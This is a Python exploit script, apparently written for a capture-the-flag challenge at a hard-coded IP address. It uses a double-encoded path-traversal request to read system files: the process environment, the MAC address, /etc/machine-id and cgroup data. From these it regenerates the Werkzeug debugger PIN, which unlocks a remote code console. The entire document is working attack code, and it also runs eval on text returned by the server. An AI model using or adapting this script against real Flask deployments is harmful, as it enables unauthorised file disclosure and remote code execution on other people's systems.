import requests
from requests import Response
import re
import hashlib
from itertools import chain
import binascii

URL = "http://167.99.8.90:7777"

def gen_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    # cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv


def get_file(file, url=URL):
    class Res(Response):
        is_found: bool
        ptext: str
    res: Res = requests.post(url+"/home", data={
        "filename": q_parse(q_parse("../../../../../../../../../../../../.."+file)),
    })
    if "Try Harder....." in res.text:
        res.is_found = False
    else:
        res.is_found = True
        res.ptext = re.findall(
            r'(?<=b\').*?(?=\' \n.*?</div>)', res.text, re.DOTALL
        )[0]
        res.ptext = eval(f"'{res.ptext}'").strip()
    return res


def q_parse(x: str):
    file = x.encode()
    file = binascii.hexlify(file).decode()
    result = ""
    for i in range(0, len(file), 2):
        result += f"%{file[i]+file[i+1]}"
    return result


def get_username():
    text = get_file("/proc/self/environ").text
    username = re.search(r"(?<=HOME=/home/).*?(?=\\x00)",
                         text, re.DOTALL).group(0)
    return username


def get_flask_dir():
    templ_flask = "/usr/local/lib/python3.%s/%s/flask/app.py"
    for version in [i for i in range(7, 10)]:
        for location in ['site-packages', 'dist-packages']:
            flask = templ_flask % (version, location)
            file = get_file(flask)
            if file.is_found:
                return flask
    print("something wrong")
    exit(1)


def get_mac(device="eth0"):
    mac = get_file(f"/sys/class/net/{device}/address").ptext
    mac = mac.replace(":", "")
    mac = eval(f"0x{mac}")
    return str(mac)


def get_machine_id():
    linux = ""
    machine_id = get_file("/etc/machine-id")
    if not machine_id.is_found:
        boot_id = get_file("/proc/sys/kernel/random/boot_id")
        linux += boot_id.ptext
    else:
        linux += machine_id.ptext
    cgroup = get_file("/proc/self/cgroup")
    try:
        linux += cgroup.text.strip().rpartition(b"/")[2]
    except:
        pass
    return linux.strip()


if __name__ == "__main__":
    username = get_username()
    print("username     :", username)
    flask_dir = get_flask_dir()
    print("flask_dir    :", flask_dir)
    mac = get_mac()
    print("mac          :", mac)
    machine_id = get_machine_id()
    print("machine_id   :", machine_id)

    pin = gen_pin(probably_public_bits=[
        username,  # username
        'flask.app',  # modname
        'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
        flask_dir,  # getattr(mod, '__file__', None),
    ], private_bits=[
        mac,  # str(uuid.getnode()),  /sys/class/net/ens33/address
        machine_id,  # get_machine_id(), /etc/machine-id
    ])
    print("pin          :", pin)
